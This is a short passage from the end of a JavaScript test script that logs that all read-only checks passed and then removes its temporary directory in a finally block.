  console.log('\nALL readonly checks passed!');
} finally {
  fs.rmSync(base, { recursive: true, force: true });
}